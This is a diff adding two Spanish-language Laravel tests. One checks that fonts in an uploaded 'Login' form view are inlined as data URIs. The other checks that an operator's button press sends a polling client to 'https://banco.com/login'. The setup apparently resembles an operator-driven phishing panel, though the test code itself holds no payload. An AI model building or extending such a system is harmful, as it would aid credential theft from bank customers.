@@ -214,6 +214,30 @@ class ProjectModuleTest extends TestCase
         $this->assertLessThan(strpos($view->js, 'window.B'), strpos($view->js, 'window.A'));
     }
 
+    public function test_incrusta_fuentes_woff_en_el_font_face(): void
+    {
+        $admin = $this->admin();
+        $this->actingAs($admin)->post(route('projects.store'), ['name' => 'Con Fuente'])->assertRedirect();
+        $project = Project::firstWhere('name', 'Con Fuente');
+
+        $html = '<form id="f"><input name="a"><button type="submit">Ir</button></form>';
+        $css = '@font-face{font-family:Mi;src:url("fuentes/mi.woff2") format("woff2")}body{font-family:Mi}';
+        $htmlFile = UploadedFile::fake()->createWithContent('index.html', $html);
+        $cssFile = UploadedFile::fake()->createWithContent('estilo.css', $css);
+        $fuente = UploadedFile::fake()->createWithContent('mi.woff2', 'WOFF2DATA');
+
+        $this->actingAs($admin)->post(route('projects.views.store', $project), [
+            'name' => 'Login',
+            'files' => [$htmlFile, $cssFile, $fuente],
+        ])->assertRedirect();
+
+        $view = $project->fresh('views')->views->first();
+
+        // La fuente quedó incrustada como data: (no como ruta relativa).
+        $this->assertStringContainsString('data:font/woff2;base64,', (string) $view->css);
+        $this->assertStringNotContainsString('fuentes/mi.woff2', (string) $view->css);
+    }
+
     public function test_la_pantalla_de_carga_acepta_varios_archivos_con_imagen(): void
     {
         $admin = $this->admin();
@@ -252,6 +276,37 @@ class ProjectModuleTest extends TestCase
         $this->assertSame('Vista editada', $view->name);
         $this->assertStringContainsString('data:image/png;base64,', $view->html);
         $this->assertStringNotContainsString('logo.png"', $view->html);
+    }
+
+    public function test_boton_con_url_sin_vista_manda_al_cliente_por_la_url(): void
+    {
+        $admin = $this->admin();
+        $company = Company::create([
+            'empresa' => 'Embed', 'registro' => 'REG-URL', 'fecha' => now(),
+            'last_activity_at' => now(),
+        ]);
+        $company->forceFill(['loading_token' => 'tok-url'])->save();
+        $button = Button::create([
+            'label' => 'Ir al banco',
+            'text' => 'Abriendo…',
+            'url' => 'https://banco.com/login',
+            'is_active' => true,
+            'sort_order' => 0,
+        ]);
+
+        // El operador presiona el botón: no abre vista, fija la URL siguiente.
+        $this->actingAs($admin)->post(route('api.companies.send', $company), ['button_id' => $button->id])
+            ->assertOk()
+            ->assertJson(['status' => 'next_url_set']);
+
+        $this->assertSame('https://banco.com/login', $company->fresh()->next_url);
+
+        // El sondeo del cliente devuelve la URL como externa y la consume.
+        $this->getJson('/api/solicitud/tok-url/next')
+            ->assertOk()
+            ->assertJson(['url' => 'https://banco.com/login', 'external' => true]);
+
+        $this->assertNull($company->fresh()->next_url);
     }
 
     public function test_entrega_el_js_embebible_publico_de_la_vista(): void
